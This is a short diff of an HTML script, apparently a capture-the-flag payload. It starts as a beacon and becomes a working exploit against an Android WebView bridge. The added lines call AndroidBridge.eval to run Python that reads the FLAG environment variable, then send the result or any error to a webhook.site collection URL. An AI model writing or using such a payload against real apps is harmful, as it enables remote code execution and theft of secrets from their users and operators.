@@ -1,21 +1,12 @@
-<script>
-  const w = "https://webhook.site/7478dc70-5247-413d-9182-735f365bb24f";
+  <script>
+    const w = "https://webhook.site/7478dc70-5247-413d-9182-735f365bb24f";
 
-  function report(stage) {
-    const pixel = new Image();
-    pixel.src = w + "?" + new URLSearchParams({ stage }).toString();
-  }
+    new Image().src = w + "?stage=page_loaded";
 
-  report("page_loaded");
-
-  const bridge = globalThis.AndroidBridge;
-  if (bridge && typeof bridge.eval === "function") {
     try {
-      report("android_bridge_available");
-    } catch (_) {
-      report("android_bridge_error");
+      const flag = AndroidBridge.eval("import os\nprint(os.environ['FLAG'])");
+      location.href = w + "?flag=" + encodeURIComponent(flag);
+    } catch (e) {
+      location.href = w + "?error=" + encodeURIComponent(String(e));
     }
-  } else {
-    report("android_bridge_unavailable");
-  }
-</script>
+  </script>
